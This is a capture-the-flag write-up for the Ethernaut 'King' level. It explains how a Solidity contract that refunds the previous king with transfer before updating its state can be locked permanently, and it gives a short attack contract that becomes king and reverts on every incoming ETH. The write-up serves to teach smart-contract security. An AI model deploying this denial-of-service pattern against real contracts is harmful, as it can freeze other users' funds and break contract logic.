---
title: "Ethernaut 09 King"
description: "Ethernaut 09 King writeup"
---

## Challenge
### Description
In the King contract, sending more ETH than the current prize pushes out the current `king` and makes you the new `king`.
The goal is to become `king` and then prevent the Ethernaut level contract from reclaiming the throne.
So simply sending more ETH to become `king` is not enough. We have to make the step that refunds ETH to the previous `king` fail when someone later triggers `receive()`.
### Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```
## Background

---

Sending ETH to a contract without calldata runs `receive()`. In `King`, sending ETH alone runs the king replacement logic.
```solidity
receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
}
```
So sending at least the current `prize` to the `King` address is enough to trigger it.

---

`transfer` sends ETH to the recipient and reverts the entire transaction if receiving fails.
`King` refunds ETH to the existing `king` before recording the new `king`.
```solidity
payable(king).transfer(msg.value);
king = msg.sender;
prize = msg.value;
```
If the previous `king` refuses ETH, `transfer` fails and execution never reaches `king = msg.sender` below it.

---

If the attack contract becomes `king` and always reverts in `receive()`, then whenever another address later tries to take the throne, `King` fails while refunding ETH to the attack contract.
```solidity
receive() external payable {
    revert("nope");
}
```
Once the attack contract becomes king, it stays `king` permanently.
## Challenge code analysis

---

First, the king replacement condition:
```solidity
require(msg.value >= prize || msg.sender == owner);
```
A regular user must send at least the current `prize` to pass `receive()`, while the `owner` passes with any amount.
The initial `owner` and `king` are the deployer, the Ethernaut Factory address. The player first has to send at least `prize` to become `king`.

---

The external call happens here.
```solidity
payable(king).transfer(msg.value);
```
ETH is sent to the existing king before the new king is recorded.
If the existing king is an EOA, it normally receives the ETH without problems. But if the existing king is a contract that refuses ETH, `transfer` reverts.
So the attack is to register a contract that cannot receive ETH as `king`.

---

Next, the order of state updates:
```solidity
payable(king).transfer(msg.value);
king = msg.sender;
prize = msg.value;
```
`king` and `prize` change only after `transfer` succeeds.
So if the current `king` refuses ETH, no matter how much ETH a challenger sends afterward, `king = msg.sender` is never executed. This ordering lets the attack contract lock the throne.

---

The King level is validated by the Factory sending ETH to the `King` contract again.
```solidity
(bool result,) = address(instance).call{value: 0}("");
!result;
return instance._king() != address(this);
```
Since the Factory is the `owner`, it passes `require(msg.value >= prize || msg.sender == owner)` even with `msg.value` of 0.
But if the current `king` is the attack contract, even `payable(king).transfer(0)` runs the attack contract's `receive()`. The attack contract reverts there, so the Factory's call fails and `king` remains the attack contract.
## Solution
Write an attack contract that sends at least the current `prize` to the `King` instance in its constructor. Here `msg.sender` is the attack contract, not an EOA, so the attack contract's address is stored as `king`.
Then make the attack contract's `receive()` always revert. After that, whenever the Ethernaut Factory or another user tries to take the throne, the call fails the moment `King` tries to refund ETH to the existing king, the attack contract.
### Exploit
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract KingAttack {
    constructor(address payable target) payable {
        (bool ok,) = target.call{value: msg.value}("");
        require(ok, "failed to become king");
    }

    receive() external payable {
        revert("refuse ether");
    }
}
```
